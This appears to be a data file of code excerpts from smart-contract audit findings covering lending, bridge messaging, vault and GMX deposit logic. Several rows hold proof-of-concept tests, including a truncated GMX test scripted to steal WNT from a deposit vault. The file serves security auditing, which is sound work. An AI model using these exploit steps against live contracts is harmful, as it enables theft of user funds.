ReputationManagerMock\n} from ""../contracts/mock/ReputationManagerMock.sol"";\nimport {\n    LenderManagerMock\n} from ""../contracts/mock/LenderManagerMock.sol"";\nimport {\n    MarketRegistryMock\n} from ""../contracts/mock/MarketRegistryMock.sol"";\n\nimport {\n    TestERC20Token\n} from ""./tokens/TestERC20Token.sol"";\n\nimport ""lib/forge-std/src/Test.sol"";\n\ncontract LoansTest is Test {\n    using AddressUpgradeable for address;\n\n    MarketRegistryMock public marketRegistry;\n\n    TellerV2 public tellerV2;\n    LenderCommitmentForwarder public lenderCommitmentForwarder;\n    CollateralManager public collateralManager;\n\n    TestERC20Token public principalToken;\n\n    address public alice = address(0x1111);\n\n    uint256 public marketId = 0;\n\n    function setUp() public {\n        tellerV2 = new TellerV2(address(0));\n\n        marketRegistry = new MarketRegistryMock();\n\n        lenderCommitmentForwarder = new LenderCommitmentForwarder(address(tellerV2), address(marketRegistry));\n\n        collateralManager = new CollateralManager();\n        collateralManager.initialize(address(new UpgradeableBeacon(address(new CollateralEscrowV1()))), address(tellerV2));\n\n        address rm = address(new ReputationManagerMock());\n        address lm = address(new LenderManagerMock());\n        tellerV2.initialize(0, address(marketRegistry), rm, address(lenderCommitmentForwarder), address(collateralManager), lm);\n\n        marketRegistry.setMarketOwner(address(this));"
"```\nfunction setLenderManager(address _lenderManager)\n    external\n    reinitializer(8)\n    onlyOwner\n{\n    _setLenderManager(_lenderManager);\n}\n\nfunction _setLenderManager(address _lenderManager)\n    internal\n    onlyInitializing\n{\n    require(_lenderManager.isContract(), ""LenderManager must be a contract"");\n    lenderManager = ILenderManager(_lenderManager);\n}\n```\n```\nfunction claimLoanNFT(uint256 _bidId)\n    external\n    acceptedLoan(_bidId, ""claimLoanNFT"")\n    whenNotPaused\n{\n    Bid storage bid = bids[_bidId];\n\n    address sender = _msgSenderForMarket(bid.marketplaceId);\n    require(sender == bid.lender, ""only lender can claim NFT"");\n    lenderManager.registerLoan(_bidId, sender);\n    bid.lender = address(lenderManager);\n}\n```\n```\nfunction getLoanLender(uint256 _bidId)\n    public\n    view\n    returns (address lender_)\n{\n    lender_ = bids[_bidId].lender;\n\n    if (lender_ == address(lenderManager)) {\n        return lenderManager.ownerOf(_bidId);\n    }\n}\n\naddress lender = getLoanLender(_bidId);\n\n// Send payment to the lender\nbid.loanDetails.lendingToken.safeTransferFrom(\n    _msgSenderForMarket(bid.marketplaceId),\n    lender,\n    paymentAmount\n);\n```"
"```\nstruct Collateral {\n    CollateralType _collateralType;\n    uint256 _amount;\n    uint256 _tokenId;\n    address _collateralAddress;\n}\n```\n```\nstruct CollateralInfo {\n    EnumerableSetUpgradeable.AddressSet collateralAddresses;\n    mapping(address => Collateral) collateralInfo;\n}\n```\n```\nmapping(uint256 => CollateralInfo) internal _bidCollaterals;\n```\n```\nfunction submitBid(\n    address _lendingToken,\n    uint256 _marketplaceId,\n    uint256 _principal,\n    uint32 _duration,\n    uint16 _APR,\n    string calldata _metadataURI,\n    address _receiver,\n    Collateral[] calldata _collateralInfo\n) public override whenNotPaused returns (uint256 bidId_) {\n    bool validation = collateralManager.commitCollateral(\n        bidId_,\n        _collateralInfo\n    );\n    // rest of code\n```\n```\n/**\n * @notice Checks the validity of a borrower's multiple collateral balances and commits it to a bid.\n * @param _bidId The id of the associated bid.\n * @param _collateralInfo Additional information about the collateral assets.\n * @return validation_ Boolean indicating if the collateral balances were validated.\n */\nfunction commitCollateral(\n    uint256 _bidId,\n    Collateral[] calldata _collateralInfo\n) public returns (bool validation_) {\n    address borrower = tellerV2.getLoanBorrower(_bidId);\n    (validation_, ) = checkBalances(borrower, _collateralInfo);\n\n    if (validation_) {\n        for (uint256 i = 0; i < _collateralInfo.length; i++) {\n            Collateral memory info = _collateralInfo[i];\n            _commitCollateral(_bidId, info);\n        }\n    }\n}\n```\n```\n/**\n * @notice Checks the validity of a borrower's collateral balance and commits it to a bid.\n * @param _bidId The id of the associated bid.\n * @param _collateralInfo Additional information about the collateral asset.\n */\nfunction _commitCollateral(\n    uint256 _bidId,\n    Collateral memory _collateralInfo\n) internal virtual {\n    CollateralInfo storage collateral = _bidCollaterals[_bidId];\n    collateral.collateralAddresses.add(_collateralInfo._collateralAddress);\n    collateral.collateralInfo[\n        _collateralInfo._collateralAddress\n    ] = _collateralInfo;\n}\n```\n```\n/**\n * @notice Withdraws deposited collateral from the created escrow of a bid that has been successfully repaid.\n * @param _bidId The id of the bid to withdraw collateral for.\n */\nfunction withdraw(uint256 _bidId) external {\n    BidState bidState = tellerV2.getBidState(_bidId);\n    if (bidState == BidState.PAID) {\n        _withdraw(_bidId, tellerV2.getLoanBorrower(_bidId));\n    } else if (tellerV2.isLoanDefaulted(_bidId)) {\n        _withdraw(_bidId, tellerV2.getLoanLender(_bidId));\n    }\n```\n```\n/**\n * @notice Sends the deposited collateral to a liquidator of a bid.\n * @notice Can only be called by the protocol.\n * @param _bidId The id of the liquidated bid.\n * @param _liquidatorAddress The address of the liquidator to send the collateral to.\n */\nfunction liquidateCollateral(uint256 _bidId, address _liquidatorAddress)\n    external\n    onlyTellerV2\n{\n    if (isBidCollateralBacked(_bidId)) {\n        BidState bidState = tellerV2.getBidState(_bidId);\n        require(bidState == BidState.LIQUIDATED, ""Loan has not been liquidated"");\n        _withdraw(_bidId, _liquidatorAddress);\n    }\n}\n```\n```\n/**\n * @notice Withdraws collateral to a given receiver's address.\n * @param _bidId The id of the bid to withdraw collateral for.\n * @param _receiver The address to withdraw the collateral to.\n */\nfunction _withdraw(uint256 _bidId, address _receiver) internal virtual {\n    for (uint256 i; i < _bidCollaterals[_bidId].collateralAddresses.length; i++) {\n        // Get collateral info\n        Collateral storage collateralInfo = _bidCollaterals[_bidId].collateralInfo[_bidCollaterals[_bidId].collateralAddresses[i]];\n        // Withdraw collateral from escrow and send it to bid lender\n        ICollateralEscrowV1(_escrows[_bidId]).withdraw(\n            collateralInfo._collateralAddress,\n            collateralInfo._amount,\n            _receiver\n        );\n```"
```\nreturn (\n    uint32(block.timestamp) -\n    _liquidationDelay -\n    lastRepaidTimestamp(_bidId) >\n    bidDefaultDuration[_bidId]\n)
"```\nfunc MigrateWithdrawal(withdrawal *LegacyWithdrawal, l1CrossDomainMessenger *common.Address) (*Withdrawal, error) {\n    value, err := withdrawal.Value()\n    if err!= nil {\n        return nil, fmt.Errorf(""cannot migrate withdrawal: %w"", err)\n    }\n\n    abi, err := bindings.L1CrossDomainMessengerMetaData.GetAbi()\n    if err!= nil {\n        return nil, err\n    }\n\n    versionedNonce := EncodeVersionedNonce(withdrawal.XDomainNonce, new(big.Int))\n\n    data, err := abi.Pack(\n        ""relayMessage"",\n        versionedNonce,\n        withdrawal.XDomainSender,\n        withdrawal.XDomainTarget,\n        value,\n        new(big.Int), // inner gas limit being set to zero\n        []byte(withdrawal.XDomainData),\n    )\n    if err!= nil {\n        return nil, fmt.Errorf(""cannot abi encode relayMessage: %w"", err)\n    }\n\n    gasLimit := MigrateWithdrawalGasLimit(data)\n\n    w := NewWithdrawal(\n        versionedNonce,\n        &predeploys.L2CrossDomainMessengerAddr,\n        l1CrossDomainMessenger,\n        value,\n        new(big.Int).SetUint64(gasLimit),\n        data,\n    )\n    return w, nil\n}\n```\nfunc MigrateWithdrawalGasLimit(data []byte) uint64 {\n    dataCost := uint64(0)\n    for _, b := range data {\n        if b == 0 {\n            dataCost += params.TxDataZeroGas\n        } else {\n            dataCost += params.TxDataNonZeroGasEIP2028\n        }\n    }\n\n    gasLimit := dataCost + 200_000\n    if gasLimit > 25_000_000 {\n        gasLimit = 25_000_000\n    }\n\n    return gasLimit\n}"
"```\nif (version == 0):\n    bytes32 oldHash = Hashing.hashCrossDomainMessageV0(_target, _sender, _message, _nonce)\n    require(\n        successfulMessages[oldHash] == false,\n        ""CrossDomainMessenger: legacy withdrawal already relayed""\n    )\n```\n```\nif err := WipePredeployStorage(db); err!= nil {\n    return nil, fmt.Errorf(""cannot wipe storage: %w"", err)\n}\n```"
"```\nfunction callWithMinGas(\n    address _target,\n    uint256 _minGas,\n    uint256 _value,\n    bytes memory _calldata\n) internal returns (bool) {\n    bool _success;\n    assembly {\n        if lt(gas(), div(mul(64, add(_minGas, 200)), 63)) {\n            mstore(0, 0x08c379a0)\n            mstore(32, 32)\n            mstore(88, 0x0000185361666543616c6c3a204e6f7420656e6f75676820676173)\n            revert(28, 100)\n        }\n\n        _success := call(\n            gas(), \n            _target, \n            _value, \n            add(_calldata, 32), \n            mload(_calldata), \n            0x00, \n            0x00\n        )\n    }\n    return _success;\n}\n```\n```\nfunc callGas(isEip150 bool, availableGas, base uint64, callCost *uint256.Int) (uint64, error) {\n    if isEip150 {\n        availableGas = availableGas - base\n        gas := availableGas - availableGas/64\n        if!callCost.IsUint64() || gas < callCost.Uint64() {\n            return gas, nil\n        }\n    }\n    if!callCost.IsUint64() {\n        return 0, ErrGasUintOverflow\n    }\n    return callCost.Uint64(), nil\n}\n```\n(1) L370~L376: call to a new account\n(2) L377~L379: call with non zero value\n(3) L380~L383: memory expansion\n```\n```\nfunc gasCall(evm *EVM, contract *Contract, stack *Stack, mem *Memory, memorySize uint64) (uint64, error) {\n    var (\n        gas            uint64\n        transfersValue =!stack.Back(2).IsZero()\n        address        = common.Address(stack.Back(1).Bytes20())\n    )\n    if evm.chainRules.IsEIP158 {\n        if transfersValue && evm.StateDB.Empty(address) {\n            gas += params.CallNewAccountGas\n        }\n    } else if!evm.StateDB.Exist(address) {\n        gas += params.CallNewAccountGas\n    }\n    if transfersValue {\n        gas += params.CallValueTransferGas\n    }\n    memoryGas, err := memoryGasCost(mem, memorySize)\n    if err!= nil {\n        return 0, err\n    }\n    var overflow bool\n    if gas, overflow = math.SafeAdd(gas, memoryGas); overflow {\n        return 0, ErrGasUintOverflow\n    }\n    evm.callGasTemp, err = callGas(evm.chainRules.IsEIP150, contract.Gas, gas, stack.Back(0))\n    if err!= nil {\n        return 0, err\n    }\n    if gas, overflow = math.SafeAdd(gas, evm.callGasTemp); overflow {\n        return 0, ErrGasUintOverflow\n    }\n    return gas, nil\n}\n```\nparams.CallValueTransferGas = (params.CallValueTransferGas - \n    params.CallStipend * 64 / 63)\n```\npackage core\n\nimport (\n	""fmt""\n)\n\ntype gasFunc func(*EVM, *Contract, *Stack, *Memory, uint64) (uint64, error)\n\nvar (\n	gasCallEIP2929 = makeCallVariantGasCallEIP2929(gasCall)\n)\n\nfunc makeCallVariantGasCallEIP2929(oldCalculator gasFunc) gasFunc {\n	return func(\n		evm *EVM,\n		contract *Contract,\n		stack *Stack,\n		mem *Memory,\n		memorySize uint64,\n	) (uint64, error) {\n		addr := common.Address(stack.Back(1).Bytes20())\n		warmAccess := evm.StateDB.AddressInAccessList(addr)\n		coldCost := params.ColdAccountAccessCostEIP2929 - params.WarmStorageReadCostEIP2929\n		if!warmAccess {\n			evm.StateDB.AddAddressToAccessList(addr)\n			if!contract.UseGas(coldCost) {\n				return 0, ErrOutOfGas\n			}\n		}\n		gas, err := oldCalculator(evm, contract, stack, mem, memorySize)\n		if warmAccess || err!= nil {\n			return gas, err\n		}\n		contract.Gas += coldCost\n		return gas + coldCost, nil\n	}\n}\n```\npragma solidity 0.8.15;\n\nimport ""forge-std/Test.sol"";\nimport ""forge-std/console.sol"";\n\nlibrary SafeCall {\n    function callWithMinGas(\n        address _target,\n        uint256 _minGas,\n        uint256 _value,\n        bytes memory _calldata\n    ) internal returns (bool) {\n        bool _success;\n        uint256 gasSent;\n        assembly {\n            if lt(gas(), div(mul(64, add(_minGas, 200)), 63)) {\n                mstore(0, 0x08c379a0)\n                mstore(32, 32)\n                mstore(\n                    88,\n                    0x0000185361666543616c6c3a204e6f7420656e6f75676820676173\n                )\n                revert(28, 100)\n            }\n            gasSent := gas()\n            _success := call(\n                gas(), // gas\n                _target, // recipient\n                _value, // ether value\n                add(_calldata, 32), // inloc\n                mload(_calldata), // inlen\n                0x00, // outloc\n                0x00 // outlen\n            )\n        }\n        console.log(""gasSent ="", gasSent);\n        return _success;\n    }\n}\n\ncontract Callee {\n    fallback() external payable {\n        uint256 gas = gasleft();\n        console.log(""gasReceived ="", gas);\n    }\n}\n\ncontract Caller {\n    function execute(\n        address _target,\n        uint256 _minGas,\n        bytes memory _calldata\n    ) external payable {\n        SafeCall.callWithMinGas(_target, _minGas, msg.value, _calldata);\n    }\n}\n\ncontract TestCallWithMinGas is Test {\n    address callee;\n    Caller caller;\n\n    function setUp() public {\n        callee = address(new Callee());\n        caller = new Caller();\n    }\n\n    function testCallWithMinGas() public {\n        console.log(""-------1st call------"");\n        caller.execute{gas: 64855}(callee, 63000, """");\n\n        console.log(""  -------2nd call------"");\n        caller.execute{gas: 64855}(callee, 63000, """");\n\n        console.log(""  -------3rd call------"");\n        caller.execute{gas: 62555, value: 1}(callee, 63000, """");\n    }\n}\n```\n```\nRunning 1 test for test/TestCallWithMinGas.sol:TestCallWithMinGas\n[PASS] testCallWithMinGas() (gas: 36065)\n\nLogs:\n  -------1st call------\n  gasReceived = 60582\n  gasSent = 64200\n\n  -------2nd call------\n  gasReceived = 63042\n  gasSent = 64200\n\n  -------3rd call------\n  gasReceived = 56483\n  gasSent = 64200\n```"
```\nfunction gas(uint256 _amountToLeave) internal view {\n    uint256 i = 0;\n    while (gasleft() > _amountToLeave) {\n        i++;\n    }\n}\n```
```\ndataLen := uint64(len(data))\n\nif dataLen > 0 {\n    // rest of code\n}\n```
"```\nfunc (evm *EVM) Call(caller ContractRef, addr common.Address, input []byte, gas uint64, value *big.Int) (ret []byte, leftOverGas uint64, err error) {\n    if addr == dump.MessagePasserAddress {\n        statedumper.WriteMessage(caller.Address(), input)\n    }\n```\n```\nmethod, err := abi.MethodById(msgB[:4])\nif err!= nil {\n    return nil, nil, fmt.Errorf(""failed to get method: %w"", err)\n}\n\nout, err := method.Inputs.Unpack(msgB[4:])\nif err!= nil {\n    return nil, nil, fmt.Errorf(""failed to unpack: %w"", err)\n}\n```"
"```\nfunction checkGasV1(bytes calldata _message)\n    public\n    view\n    returns (uint256, uint256)\n{\n    uint256 gas1 = gasleft();\n    bytes32 versionedHash = Hashing.hashCrossDomainMessageV1(\n        0,\n        address(this),\n        address(this),\n        0,\n        0,\n        _message\n    );\n    uint256 gas2 = gasleft();\n    return (_message.length, gas1 - gas2);\n}\n```\n```\nfunction checkGasV0(bytes calldata _message)\n    public\n    view\n    returns (\n        uint256,\n        uint256,\n        uint256\n    ) {\n    uint256 gas1 = gasleft();\n    bytes32 versionedHash1 = Hashing.hashCrossDomainMessageV0(\n        address(this),\n        address(this),\n        _message,\n        0\n    );\n    uint256 gas2 = gasleft();\n    uint256 gas3 = gasleft();\n    bytes32 versionedHash2 = Hashing.hashCrossDomainMessageV1(\n        0,\n        address(this),\n        address(this),\n        0,\n        0,\n        _message\n    );\n    uint256 gas4 = gasleft();\n    return (_message.length, gas1 - gas2, gas3 - gas4);\n}\n```"
"```\nif (ownerToRollOverQueueIndex[_receiver]!= 0) {\n    uint256 index = getRolloverIndex(_receiver);\n    rolloverQueue[index].assets = _assets;\n    rolloverQueue[index].epochId = _epochId;\n}\n```\n```\nownerToRolloverQueueIndex[_receiver] = rolloverQueue.length;\n```\nQueueItem memory item = rolloverQueue[getRolloverIndex(_receiver)];\n\nif (\n    item.epochId == _epochId &&\n    (balanceOf(_receiver, _epochId) - item.assets) < _assets\n) {\n    revert AlreadyRollingOver();\n}\n```"
"```\nrolloverQueue[index].assets = _assets;\n```\n```\nif (epochResolved[queue[index].epochId]) {\n    uint256 entitledShares = previewWithdraw(queue[index].epochId, queue[index].assets);\n    if (entitledShares > queue[index].assets) {\n        _burn(queue[index].receiver, queue[index].epochId, queue[index].assets);\n```\n```\nuint256 assetsToMint = queue[index].assets - relayerFee;\n_mintShares(queue[index].receiver, _epochId, assetsToMint);\n```\n```\n_burn(_owner, _id, _assets);\n_burnEmissions(_owner, _id, _assets);\n\nuint256 entitledShares;\nuint256 entitledEmissions = previewEmissionsWithdraw(_id, _assets);\n\nif (epochNull[_id] == false) {\n    entitledShares = previewWithdraw(_id, _assets);\n} else {\n    entitledShares = _assets;\n}\n\nif (entitledShares > 0) {\n    SemiFungibleVault.asset.safeTransfer(_receiver, entitledShares);\n}\n\nif (entitledEmissions > 0) {\n    emissionsToken.safeTransfer(_receiver, entitledEmissions);\n}\n```"
"```\nfunction _mintShares(\n    address to,\n    uint256 id,\n    uint256 amount\n) internal {\n    _mint(to, id, amount, EMPTY);\n    _mintEmissions(to, id, amount);\n}\n```\n```\nfunction _mint(\n    address to,\n    uint256 id,\n    uint256 amount,\n    bytes memory data\n) internal virtual {\n    require(to!= address(0), ""ERC1155: mint to the zero address"");\n\n    address operator = _msgSender();\n    uint256[] memory ids = _asSingletonArray(id);\n    uint256[] memory amounts = _asSingletonArray(amount);\n\n    _beforeTokenTransfer(operator, address(0), to, ids, amounts, data);\n\n    _balances[id][to] += amount;\n    emit TransferSingle(operator, address(0), to, id, amount);\n\n    _afterTokenTransfer(operator, address(0), to, ids, amounts, data);\n\n    _doSafeTransferAcceptanceCheck(operator, address(0), to, id, amount, data);\n}\n```"
"```\nconstructor(\n    address _treasury\n) public SemiFungibleVault(IERC20(_assetAddress), _name, _symbol, _tokenURI) {\n    treasury = _treasury;\n    whitelistedAddresses[_treasury] = true;\n}\n\nfunction setTreasury(address _treasury) public onlyFactory {\n    if (_treasury == address(0)) {\n        revert AddressZero();\n    }\n    treasury = _treasury;\n}\n```\n```\nconstructor(\n    address _treasury\n) {\n    treasury = _treasury;\n}\n\nfunction triggerEndEpoch(uint256 _marketId, uint256 _epochId) public {\n    // send premium fees to treasury and remaining TVL to collateral vault\n    premiumVault.sendTokens(_epochId, premiumFee, treasury);\n    // strike price reached so collateral is entitled to collateralTVLAfterFee\n    premiumVault.sendTokens(\n        _epochId,\n        premiumTVLAfterFee,\n        address(collateralVault)\n    )\n}\n```"
"```\nwhile ((length - _operations) <= i) {\n    _mintShares(\n        queue[i].receiver,\n        _epochId,\n        queue[i].assets - relayerFee\n    );\n    emit Deposit(\n        msg.sender,\n        queue[i].receiver,\n        _epochId,\n        queue[i].assets - relayerFee\n    );\n    depositQueue.pop();\n    if (i == 0) break;\n    unchecked {\n        i--;\n    }\n}\n```"
"```\nfunction changeTreasury(uint256 _marketId, address _treasury)\n    public\n    onlyTimeLocker\n{\n    if (_treasury == address(0)) {\n        revert AddressZero();\n    }\n\n    address[2] memory vaults = marketIdToVaults[_marketId];\n\n    if (vaults[0] == address(0) || vaults[1] == address(0)) {\n        revert MarketDoesNotExist(_marketId);\n    }\n\n    IVaultV2(vaults[0]).whiteListAddress(_treasury);\n    IVaultV2(vaults[1]).whiteListAddress(_treasury);\n    IVaultV2(vaults[0]).setTreasury(_treasury);\n    IVaultV2(vaults[1]).setTreasury(_treasury);\n\n    emit AddressWhitelisted(_treasury, _marketId);\n}\n```"
```\nif (entitledShares > queue[index].assets) {\n    if (queue[index].assets < relayerFee) {\n        index++;\n        continue;\n    }\n}\n```
"```\n2) Admin can configure new markets and epochs on those markets, \n    Timelock can make critical changes like changing the oracle or whitelisting controllers.\n```\n```\nfunction changeOwner(address _owner) public onlyTimeLocker {\n    if (_owner == address(0)) {\n        revert AddressZero();\n    }\n    _transferOwnership(_owner);\n}\n```\n```\nfunction transferOwnership(address newOwner) public virtual onlyOwner {\n    require(newOwner!= address(0), ""Ownable: new owner is the zero address"");\n    _transferOwnership(newOwner);\n}\n```"
"```\nfunction changeTreasury(uint256 _marketId, address _treasury)\n    public\n    onlyTimeLocker\n{\n    if (_treasury == address(0)) {\n        revert AddressZero();\n    }\n\n    address[2] memory vaults = marketIdToVaults[_marketId];\n\n    if (vaults[0] == address(0) || vaults[1] == address(0)) {\n        revert MarketDoesNotExist(_marketId);\n    }\n\n    IVaultV2(vaults[0]).whiteListAddress(_treasury);\n    IVaultV2(vaults[1]).whiteListAddress(_treasury);\n    IVaultV2(vaults[0]).setTreasury(_treasury);\n    IVaultV2(vaults[1]).setTreasury(_treasury);\n\n    emit AddressWhitelisted(_treasury, _marketId);\n}\n```\n```\npremiumVault.sendTokens(_epochId, premiumFee, treasury);\npremiumVault.sendTokens(\n    _epochId,\n    premiumTVL - premiumFee,\n    address(collateralVault)\n);\n\ncollateralVault.sendTokens(_epochId, collateralFee, treasury);\ncollateralVault.sendTokens(\n    _epochId,\n    collateralTVL - collateralFee,\n    address(premiumVault)\n)"
"```\nuint256 entitledShares = previewWithdraw(queue[index].epochId, queue[index].assets);\n\nif (entitledShares > queue[index].assets) {\n```"
"```\nif (block.timestamp < uint256(epochStart)) {\n    revert EpochNotStarted();\n}\n```\n```\nif (block.timestamp > epochConfig[_id].epochBegin) {\n    revert EpochAlreadyStarted();\n}\n```\n```\nfunction previewEmissionsWithdraw(uint256 _id, uint256 _assets)\n    public\n    view\n    returns (uint256 entitledAmount)\n{\n    entitledAmount = _assets.mulDivDown(emissions[_id], finalTVL[_id]);\n}\n\nuint256 entitledEmissions = previewEmissionsWithdraw(_id, _assets);\nif (epochNull[_id] == false) {\n    entitledShares = previewWithdraw(_id, _assets);\n} else {\n    entitledShares = _assets;\n}\nif (entitledShares > 0) {\n    SemiFungibleVault.asset.safeTransfer(_receiver, entitledShares);\n}\nif (entitledEmissions > 0) {\n    emissionsToken.safeTransfer(_receiver, entitledEmissions);\n}\n```"
"```\nfunction testBorrowOverflow() public {\n    uint256 borrowAmount = 1e40;\n    BorrowArg[] memory borrowArgs = new BorrowArg[](1);\n    (,, uint256 loanId, ) = kairos.getParameters();\n    loanId += 1;\n\n    Offer memory offer = Offer({\n        assetToLend: money,\n        loanToValue: 1e61,\n        duration: 1,\n        expirationDate: block.timestamp + 2 hours,\n        tranche: 0,\n        collateral: getNft()\n    });\n\n    uint256 currentTokenId;\n\n    getFlooz(signer, money, getOfferArg(offer).amount);\n\n    {\n        OfferArg[] memory offerArgs = new OfferArg[](1);\n        currentTokenId = getJpeg(BORROWER, nft);\n        offer.collateral.id = currentTokenId;\n        offerArgs[0] = OfferArg({\n            signature: getSignature(offer),\n            amount: borrowAmount,\n            offer: offer\n        });\n        borrowArgs[0] = BorrowArg({nft: NFToken({id: currentTokenId, implem: nft}), args: offerArgs});\n    }\n\n    vm.prank(BORROWER);\n    kairos.borrow(borrowArgs);\n\n    assertEq(nft.balanceOf(BORROWER), 0);\n    assertEq(money.balanceOf(BORROWER), borrowAmount);\n    assertEq(nft.balanceOf(address(kairos)), 1);\n\n    vm.warp(block.timestamp + 1);\n    Loan memory loan = kairos.getLoan(loanId);\n    console.log(""price of loanId"", kairos.price(loanId));\n}\n```"
"```\nfunction sendInterests(Loan storage loan, Provision storage provision) internal returns (uint256 sent) {\n    uint256 interests = loan.payment.paid - loan.lent;\n    if (interests == loan.payment.minInterestsToRepay) {\n        sent = provision.amount + (interests / loan.nbOfPositions);\n    } else {\n        sent = provision.amount + (interests * (provision.amount)) / loan.lent;\n    }\n    loan.assetLent.checkedTransfer(msg.sender, sent);\n}\n```"
"```\nfunction sendInterests(Loan storage loan, Provision storage provision) internal returns (uint256 sent) {\n    uint256 interests = loan.payment.paid - loan.lent;\n    if (interests == loan.payment.minInterestsToRepay) {\n        sent = provision.amount + (interests / loan.nbOfPositions);\n    } else {\n        sent = provision.amount + (interests * (provision.amount)) / loan.lent;\n    }\n    loan.assetLent.checkedTransfer(msg.sender, sent);\n}\n```"
"```\ntry IDepositCallbackReceiver(deposit.callbackContract()).afterDepositExecution(\n    gas = deposit.callbackGasLimit()\n) {\n    catch (bytes memory reasonBytes) {\n        (string memory reason, ) = ErrorUtils.getRevertMessage(reasonBytes);\n        emit AfterDepositExecutionError(key, deposit, reason, reasonBytes);\n    }\n```"
"```\nfunction executeDeposit(\n    bytes32 key,\n    OracleUtils.SetPricesParams calldata oracleParams\n) external\n    globalNonReentrant\n    onlyOrderKeeper\n    withOraclePrices(oracle, dataStore, eventEmitter, oracleParams)\n{\n    uint256 startingGas = gasleft();\n\n    try {\n        this._executeDeposit(\n            key,\n            oracleParams,\n            msg.sender,\n            startingGas\n        );\n    } catch (bytes memory reasonBytes) {\n        _handleDepositError(\n            key,\n            startingGas,\n            reasonBytes\n        );\n    }\n}\n```"
"```\nfunction createDeposit(\n    DataStore dataStore,\n    EventEmitter eventEmitter,\n    DepositVault depositVault,\n    address account,\n    CreateDepositParams memory params\n) external returns (bytes32) {\n    Market.Props memory market = MarketUtils.getEnabledMarket(dataStore, params.market);\n\n    uint256 initialLongTokenAmount = depositVault.recordTransferIn(params.initialLongToken);\n    uint256 initialShortTokenAmount = depositVault.recordTransferIn(params.initialShortToken);\n\n    address wnt = TokenUtils.wnt(dataStore);\n\n    if (market.longToken == wnt) {\n        initialLongTokenAmount -= params.executionFee;\n    } else if (market.shortToken == wnt) {\n        initialShortTokenAmount -= params.executionFee;\n    }\n```\n```\ndiff --git a/gmx-synthetics/test/router/ExchangeRouter.ts b/gmx-synthetics/test/router/ExchangeRouter.ts\nindex 7eca238..c40a71c 100644\n--- a/gmx-synthetics/test/router/ExchangeRouter.ts\n+++ b/gmx-synthetics/test/router/ExchangeRouter.ts\n@@ -103,6 +103,82 @@\n  describe(""ExchangeRouter"", () => {\n    it(""createDepositPoC"", async () => {\n      // simulate normal user deposit\n      await usdc.mint(user0.address, expandDecimals(50 * 1000, 6));\n      await usdc.connect(user0).approve(router.address, expandDecimals(50 * 1000, 6));\n\n      const tx = await exchangeRouter.connect(user0).multicall([\n        exchangeRouter.interface.encodeFunctionData(""sendWnt"", [depositVault.address, expandDecimals(11, 18)]),\n        exchangeRouter.interface.encodeFunctionData(""sendTokens"", [\n          usdc.address,\n          depositVault.address,\n          expandDecimals(50 * 1000, 6),\n        ]),\n        exchangeRouter.interface.encodeFunctionData(""createDeposit"", [\n          {\n            receiver: user0.address,\n            callbackContract: user2.address,\n            market: ethUsdMarket.marketToken,\n            initialLongToken: ethUsdMarket.longToken,\n            initialShortToken: ethUsdMarket.shortToken,\n            longTokenSwapPath: [ethUsdMarket.marketToken, ethUsdSpotOnlyMarket.marketToken],\n            shortTokenSwapPath: [ethUsdSpotOnlyMarket.marketToken, ethUsdMarket.marketToken],\n            minMarketTokens: 100,\n            shouldUnwrapNativeToken: true,\n            executionFee,\n            callbackGasLimit: ""200000"",\n          },\n        ]),\n      ], { value: expandDecimals(11, 18) });\n\n      // depositVault has WNT balance now\n      let vaultWNTBalance = await wnt.balanceOf(depositVault.address);\n      expect(vaultWNTBalance).eq(expandDecimals(11, 18));\n\n      // user1 steal WNT from depositVault\n      await usdc.mint(user1.address, vaultWNTBalance.add(1));\n      await usdc.connect(user1).approve(router.address, vaultWNTBalance.add(1));\n\n      // Step 1. create deposit with malicious initialLongToken\n      await exchangeRouter.connect(user1)."
"```\nfunction getTotalBorrowingFees(\n    DataStore dataStore,\n    address market,\n    address longToken,\n    address shortToken,\n    bool isLong\n) internal view returns (uint256) {\n    uint256 openInterest = getOpenInterest(\n        dataStore,\n        market,\n        longToken,\n        shortToken,\n        isLong\n    );\n    uint256 cumulativeBorrowingFactor = getCumulativeBorrowingFactor(\n        dataStore,\n        market,\n        isLong\n    );\n    uint256 totalBorrowing = getTotalBorrowing(\n        dataStore,\n        market,\n        isLong\n    );\n    return openInterest * cumulativeBorrowingFactor - totalBorrowing;\n}\n```\n```\nuint256 durationInSeconds = getSecondsSinceCumulativeBorrowingFactorUpdated(dataStore, market.marketToken, isLong);\nuint256 borrowingFactorPerSecond = getBorrowingFactorPerSecond(\n    dataStore,\n    market,\n    prices,\n    isLong\n);\n\nuint256 cumulativeBorrowingFactor = getCumulativeBorrowingFactor(dataStore, market.marketToken, isLong);\n\nuint256 delta = durationInSeconds * borrowingFactorPerSecond;\nuint256 nextCumulativeBorrowingFactor = cumulativeBorrowingFactor + delta;\nreturn (nextCumulativeBorrowingFactor, delta);\n```"
"```\nthe oracle process:\n\n    1. the oracle node checks the latest price from reference exchanges and stores it with the oracle node's timestamp, e.g. time: 1000\n    2. the oracle node checks the latest block of the blockchain, e.g. block 100, it stores this with the oracle node's timestamp as well\n    3. the oracle node signs\n        minOracleBlockNumber: 100\n        maxOracleBlockNumber: 100\n        timestamp: 1000\n        price: <price>\n    4. the next time the loop runs is at time 1001, if the latest block of the blockchain is block 105, e.g. if 5 blocks were produced in that one second, then the oracle would sign\n        minOracleBlockNumber: 101\n        maxOracleBlockNumber: 105\n        timestamp: 1001\n        price: <price>\n```"
"```\nfunction createOrder(\n    DataStore dataStore,\n    EventEmitter eventEmitter,\n    OrderVault orderVault,\n    IReferralStorage referralStorage,\n    address account,\n    BaseOrderUtils.CreateOrderParams memory params\n) external returns (bytes32) {\n    ReferralUtils.setTraderReferralCode(referralStorage, account, params.referralCode);\n\n    uint256 initialCollateralDeltaAmount;\n\n    address wnt = TokenUtils.wnt(dataStore);\n\n    bool shouldRecordSeparateExecutionFeeTransfer = true;\n\n    if (\n        params.orderType == Order.OrderType.MarketSwap ||\n        params.orderType == Order.OrderType.LimitSwap ||\n        params.orderType == Order.OrderType.MarketIncrease ||\n        params.orderType == Order.OrderType.LimitIncrease\n    ) {\n        initialCollateralDeltaAmount = orderVault.recordTransferIn(params.addresses.initialCollateralToken);\n        if (params.addresses.initialCollateralToken == wnt) {\n            if (initialCollateralDeltaAmount < params.numbers.executionFee) {\n                revert InsufficientWntAmountForExecutionFee(initialCollateralDeltaAmount, params.numbers.executionFee);\n            }\n            initialCollateralDeltaAmount -= params.numbers.executionFee;\n            shouldRecordSeparateExecutionFeeTransfer = false;\n        }\n    } else if (\n        params.orderType == Order.OrderType.MarketDecrease ||\n        params.orderType == Order.OrderType.LimitDecrease ||\n        params.orderType == Order.OrderType.StopLossDecrease\n    ) {\n        